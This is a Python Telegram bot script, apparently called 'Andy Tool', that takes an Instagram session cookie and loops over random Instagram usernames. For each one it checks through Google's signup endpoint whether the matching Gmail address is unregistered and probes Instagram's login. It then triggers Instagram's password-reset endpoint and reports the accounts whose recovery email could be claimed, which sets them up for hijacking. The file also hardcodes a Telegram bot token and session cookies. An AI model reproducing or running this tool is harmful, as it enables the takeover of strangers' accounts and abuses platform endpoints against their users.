os.system('pip install telebot')
os.system('pip install threading')
os.system('pip install user_agent')
os.system('pip install random')
os.system('pip install urllib')
import requests
from requests import *
import random
import telebot
from telebot import types
import urllib
from cfonts import render
import time
import threading
import json
import sys
import os
from uuid import uuid4
from user_agent import generate_user_agent
uid = uuid4()
token = '5568501920:AAEBM9rfdd9Lg3l7pQ35GLabfjMU3DBYp3o'
bot = telebot.TeleBot(token)
A = types.InlineKeyboardMarkup(row_width=2)
B = types.InlineKeyboardButton(text ="• 𝙲𝙰𝙷𝙽𝙽𝙴𝙻 •" , url = "t.me/OYURL")
C = types.InlineKeyboardButton(text ="• 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁" , url = "t.me/IIlAndylII")
A.add(B,C)
@bot.message_handler(commands=["start"])
def start(message):
	ural='https://t.me/G_PPPPP/9','https://t.me/G_PPPPP/8','https://t.me/G_PPPPP/25','https://t.me/G_PPPPP/22','https://t.me/G_PPPPP/32','https://t.me/G_PPPPP/31','https://t.me/G_PPPPP/65','https://t.me/G_PPPPP/66','https://t.me/G_PPPPP/67','https://t.me/G_PPPPP/68','https://t.me/G_PPPPP/69','https://t.me/G_PPPPP/70','https://t.me/G_PPPPP/72','https://t.me/G_PPPPP/73'
	urlm = random.choice(ural)
	Name = message.chat.first_name
	User = message.from_user.username
	iD = message.chat.id
	bot.send_photo(message.chat.id,urlm, """ 🇪?
•━━━━━━━━━━━━•
𝑯𝑰 𝑷𝑹𝑶-->[{}]

𝐢𝐧 AVAILABLE ʙᴏᴛ ࿈
𝑪𝑯𝑶𝑶𝑺𝑬 𝑭𝑹𝑶𝑴 𝑩𝑼𝑻𝑻𝑶𝑵𝑺 
•━━━━━━━━━━━━• \n قم بارسال السيزون 

𝚂𝙴𝙽𝙳 𝚃𝙷𝙴 sessionid 📎 🇪 """.format(Name,User), parse_mode = "markdown" , reply_markup = A)
@bot.message_handler(func=lambda m: True)
def fael(message):
    sessionid = str(message.text)
    ch = bot.send_message(message.chat.id,text=f"❝𝐖𝐞𝐥𝐜𝐨𝐦𝐞 To Andy 𝐓𝐨𝐨𝐥❞ 🔱 @OYURL , @IIlAndylII")
    ch= bot.send_message(message.chat.id,text=f"💤WAIT|إنتظر💤\n•", reply_markup = A)
    bot.edit_message_text(chat_id=message.chat.id,message_id=ch.message_id,text=f"💤WAIT|إنتظر💤\n••", reply_markup = A)
    URL = str(message.text)
    bot.edit_message_text(chat_id=message.chat.id,message_id=ch.message_id,text=f"💤WAIT|إنتظر💤\n•••", reply_markup = A)
    bot.edit_message_text(chat_id=message.chat.id,message_id=ch.message_id,text=f"💤WAIT|إنتظر💤\n••••", reply_markup = A)
    bot.edit_message_text(chat_id=message.chat.id,message_id=ch.message_id,text=f"💤WAIT|إنتظر💤\n•••••", reply_markup = A)
    bot.edit_message_text(chat_id=message.chat.id,message_id=ch.message_id,text=f"💤WAIT|إنتظر💤\n••••••", reply_markup = A)
    bot.edit_message_text(chat_id=message.chat.id,message_id=ch.message_id,text=f"💤WAIT|إنتظر💤\n••", reply_markup = A)
    URL = str(message.text)
    bot.edit_message_text(chat_id=message.chat.id,message_id=ch.message_id,text=f"💤WAIT|إنتظر💤\n•••", reply_markup = A)
    bot.edit_message_text(chat_id=message.chat.id,message_id=ch.message_id,text=f"💤WAIT|إنتظر💤\n••••", reply_markup = A)
    bot.edit_message_text(chat_id=message.chat.id,message_id=ch.message_id,text=f"💤WAIT|إنتظر💤\n•••••", reply_markup = A)
    bot.edit_message_text(chat_id=message.chat.id,message_id=ch.message_id,text=f"💤WAIT|إنتظر💤\n••••••", reply_markup = A)
    header = {'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sessionid}
    while True:
        user='1234567890qwertyuiopasdfghjklzxcvbnm.'
        num='456789'
        rng=int("".join(random.choice(num)for i in range(1)))
        name=str("".join(random.choice(user)for i in range(rng)))
        chc = requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=header)
        dead=0
        if "users" in chc.text:
         for i in chc.json()["users"]:
        	 dead+=1
        	 user=(i['user']['username'])
        	 em = user
        	 email = em+"@gmail.com"
        	 url = 'https://android.clients.google.com/setup/checkavail'
        	 hed = {
	    'Content-Length':'98',
	    'Content-Type':'text/plain; charset=UTF-8',
	    'Host':'android.clients.google.com',
	    'Connection':'Keep-Alive',
	    'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
        	 data = json.dumps({
	'username':email,
	'version':'3',
	'firstName':'@IIlAndylII',
	'lastName':'OYURL'})
        	 res = requests.post(url,data=data,headers=hed)
        	 if res.json()['status'] == 'SUCCESS':
        	     url='https://i.instagram.com/api/v1/accounts/login/'
        	     headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)','Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                 'Host':'i.instagram.com'}
        	     data = {'uuid':uid,'password':'OYURL',
            'username':email,
            'device_id':uid,
            'from_reg':'false',
            '_csrftoken':'missing',
            'login_attempt_countn':'0'}
        	     req= requests.post(url, headers=headers, data=data).json()
        	     if req['message'] == 'The password you entered is incorrect. Please try again.':
        	              bot.edit_message_text(chat_id=message.chat.id,message_id=ch.message_id,text=f'✅ GoD Email ☞ {email} ❤️‍🔥' ,reply_markup = A)
        	              try:
        	               url = f"https://mr-abood.herokuapp.com/Instagram/Info?User={user}"
        	               r = requests.get(url).json()
        	               NAME = r["results"]["name"]
        	               POSTS = r["results"]["Posts"]
        	               Followers = r["results"]["Followers"]
        	               Following = r["results"]["Following"]
        	               idd = r["results"]["id"]
        	               Data = r["results"]["created date"]
        	               he = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar',
'cookie': 'csrftoken=qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI;mid=Yw2UXgAEAAE4Z0qqjhY5LAruCxGL;ig_did=581A8852-CB4E-4DCE-8112-8DBD48CFA6DF;ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'x-asbd-id': '198387',
'x-csrftoken': 'qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': '0',
}
        	               url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
        	               he = {
'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
'Cookie2': '$Version=1',
'Accept-Language': 'ar-EG, en-US',
'X-IG-Connection-Type': 'MOBILE(LTE)',
'X-IG-Capabilities': 'AQ==',
'Accept-Encoding': 'gzip',
}
        	               data = {
"user_id":idd,"device_id":uid,
}
        	               code = requests.post(url,headers=he, data=data).json()
        	               rest = code["obfuscated_email"]
        	               d = f"""
⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ 𝙳𝙴𝙰𝙳 𝙲𝙾𝙳𝙴 ⌯
•━━━━━━━━━━━━━━━•
⌯ 𝙽𝙰𝙼𝙴 » {NAME}
⌯ 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 » {user}
⌯ 𝙴𝙼𝙰𝙸𝙻 » {email}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 » {Followers}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 » {Following}
⌯ 𝙸𝙳 » {idd}
⌯ 𝙿𝙾𝚂𝚃𝚂 » {POSTS}
⌯ 𝙳𝙰𝚃𝙰 » {Data}
⌯ 𝚁𝙴𝚂𝚃 » {rest}
⌯ 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}
•━━━━━━━━━━━━━━━•
◔‌◔ ʙʏ » @IIlAndylII - @OYURL ."""
        	               bot.send_message(message.chat.id,text=d)
        	              except:
        	               r = requests.get(f"https://mr-abood.herokuapp.com/Instagram/Info?User={user}").json()
        	               POSTS = r["results"]["Posts"]
        	               Followers = r["results"]["Followers"]
        	               Following = r["results"]["Following"]
        	               idd = r["results"]["id"]
        	               Data = r["results"]["created date"]
        	               d = f'''⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ 𝙳𝙴𝙰𝙳 𝙲𝙾𝙳𝙴 ⌯
•━━━━━━━━━━━━━━━•
⌯ 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 » {user}
⌯ 𝙴𝙼𝙰𝙸𝙻 » {email}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 » {Followers}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 » {Following}
⌯ 𝙸𝙳 » {idd}
⌯ 𝙿𝙾𝚂𝚃𝚂 » {POSTS}
⌯ 𝙳𝙰𝚃𝙰 » {Data}
⌯ 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}
•━━━━━━━━━━━━━━━•
◔‌◔ ʙʏ » @IIlAndylII - @OYURL .'''
        	               bot.send_message(message.chat.id,text=d)
        	               pass
        	     if req['message'] == 'The password you entered is incorrect. Please try again or log in with Facebook.':
        	         bot.edit_message_text(chat_id=message.chat.id,message_id=ch.message_id,text=f'✅ GoD Email ☞ {email} ❤️‍🔥' ,reply_markup = A)
        	         try:
        	          url = f"https://mr-abood.herokuapp.com/Instagram/Info?User={user}"
        	          r = requests.get(url).json()
        	          NAME = r["results"]["name"]
        	          POSTS = r["results"]["Posts"]
        	          Followers = r["results"]["Followers"]
        	          Following = r["results"]["Following"]
        	          idd = r["results"]["id"]
        	          Data = r["results"]["created date"]
        	          he = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar',
'cookie': 'csrftoken=qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI;mid=Yw2UXgAEAAE4Z0qqjhY5LAruCxGL;ig_did=581A8852-CB4E-4DCE-8112-8DBD48CFA6DF;ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'x-asbd-id': '198387',
'x-csrftoken': 'qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': '0',
}
        	          url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
        	          he = {
'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
'Cookie2': '$Version=1',
'Accept-Language': 'ar-EG, en-US',
'X-IG-Connection-Type': 'MOBILE(LTE)',
'X-IG-Capabilities': 'AQ==',
'Accept-Encoding': 'gzip',
}
        	          data = {
"user_id":idd,"device_id":uid,
}
        	          code = requests.post(url,headers=he, data=data).json()
        	          rest = code["obfuscated_email"]
        	          d = f"""
⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ 𝙳𝙴𝙰𝙳 𝙲𝙾𝙳𝙴 ⌯
•━━━━━━━━━━━━━━━•
⌯ 𝙽𝙰𝙼𝙴 » {NAME}
⌯ 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 » {user}
⌯ 𝙴𝙼𝙰𝙸𝙻 » {email}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 » {Followers}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 » {Following}
⌯ 𝙸𝙳 » {idd}
⌯ 𝙿𝙾𝚂𝚃𝚂 » {POSTS}
⌯ 𝙳𝙰𝚃𝙰 » {Data}
⌯ 𝚁𝙴𝚂𝚃 » {rest}
⌯ 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}
•━━━━━━━━━━━━━━━•
◔‌◔ ʙʏ » @IIlAndylII - @OYURL ."""
        	          bot.send_message(message.chat.id,text=d)
        	         except:
        	          r = requests.get(f"https://mr-abood.herokuapp.com/Instagram/Info?User={user}").json()
        	          POSTS = r["results"]["Posts"]
        	          Followers = r["results"]["Followers"]
        	          Following = r["results"]["Following"]
        	          idd = r["results"]["id"]
        	          Data = r["results"]["created date"]
        	          d = f'''⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ 𝙳𝙴𝙰𝙳 𝙲𝙾𝙳𝙴 ⌯
•━━━━━━━━━━━━━━━•
⌯ 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 » {user}
⌯ 𝙴𝙼𝙰𝙸𝙻 » {email}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 » {Followers}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 » {Following}
⌯ 𝙸𝙳 » {idd}
⌯ 𝙿𝙾𝚂𝚃𝚂 » {POSTS}
⌯ 𝙳𝙰𝚃𝙰 » {Data}
⌯ 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}
•━━━━━━━━━━━━━━━•
◔‌◔ ʙʏ » @IIlAndylII - @OYURL .'''
        	          bot.send_message(message.chat.id,text=d)
        	          pass
        	         if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
        	             bot.edit_message_text(chat_id=message.chat.id,message_id=ch.message_id,text=f'❌ Not Insta ☞ {email} 🛡',reply_markup = A)
        	         else:
        	             bot.edit_message_text(chat_id=message.chat.id,message_id=ch.message_id,text=f'❌ Not Insta ☞ {email} 🛡',reply_markup = A)
        	 elif res.json()['status'] =='USERNAME_UNAVAILABLE':
        	     bot.edit_message_text(chat_id=message.chat.id,message_id=ch.message_id,text=f'❌ BaD Email ☞ {email} 🛡',reply_markup = A)
        	 else:
        	     bot.edit_message_text(chat_id=message.chat.id,message_id=ch.message_id,text="YOUR IP BOCKID 😓")
        	     sys.exit()		    
bot.infinity_polling()        	     
